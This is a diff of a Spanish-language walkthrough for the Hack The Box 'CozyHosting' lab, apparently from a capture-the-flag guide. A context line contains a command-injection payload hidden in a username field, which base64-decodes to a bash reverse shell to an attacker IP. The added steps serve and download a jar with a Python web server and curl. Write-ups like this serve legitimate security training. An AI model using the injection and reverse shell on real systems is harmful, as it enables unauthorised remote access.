@@ -111,7 +111,26 @@ dirsearch -u http://cozyhosting.htb/
   ```kanderson;echo${IFS}"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4zLzk5OTkgMD4mMQ=="|base64${IFS}-d|bash;```
 -   Ya ingresado, revisamos el Burpsuite
 ![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/afc53d27-78bb-44ab-969f-e6c2fa362e4d)
+- Click Derehco y send to repeater
+- Si tarda en respondernos es buena señal
+![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/caff2d63-f748-4199-9633-e8fed77d0b35)
+-Ahora iniciamos la virtual machine para descargar el jar python3 -m
+```http.server 9999  ```
+- El siguiente paso es saber nuestra ip, para ello usamos
+- ```ifconfig ```
+- La ip esta en ![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/60f6410c-ddf6-4e72-a7a0-796317875ae1)
 
+- La copiamos y lo pegamos
+- Ya con la ip usamos este comando
+```curl "TUIP BORRA LAS COMILLAS" :9999/cloudhosting-0.0.1.jar > cloudhosting.jar```
+- Si todo salio bien, nos saldra algo asi. Lo que significa que se descargo con exito.
+![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/76099734-7371-4c0e-b4e9-d967a80c2cfe)
+- Luego buscamos donde esta el archivo con
+```pwd```       
+- ya sabiendo lo abrimos
+  ```cd /root```
+```java -jar cloudhosting.jar```
 
+      
 
 
